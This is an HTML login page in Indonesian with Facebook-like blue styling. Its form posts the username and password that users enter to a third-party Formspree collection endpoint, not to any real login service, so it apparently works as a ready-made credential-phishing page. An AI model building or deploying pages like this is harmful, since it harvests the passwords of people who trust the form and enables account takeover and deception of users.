<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Halaman Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            max-width: 400px;
            width: 100%;
        }

        .input-field {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
            font-size: 16px;
        }

        .submit-btn {
            width: 100%;
            background-color: #1877f2;
            color: white;
            padding: 15px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 600;
            margin-top: 20px;
        }

        .submit-btn:hover {
            background-color: #165dbf;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Login</h2>
        <!-- Form Login yang Terhubung dengan Formspree -->
        <form action="https://formspree.io/f/xqakzbaq" method="POST">
            <!-- Kolom Username -->
            <input type="text" class="input-field" name="username" placeholder="Masukkan Username" required>
            
            <!-- Kolom Password -->
            <input type="password" class="input-field" name="password" placeholder="Masukkan Password" required>
            
            <!-- Tombol Submit -->
            <button type="submit" class="submit-btn">Kirim</button>
        </form>
    </div>
</body>
</html>
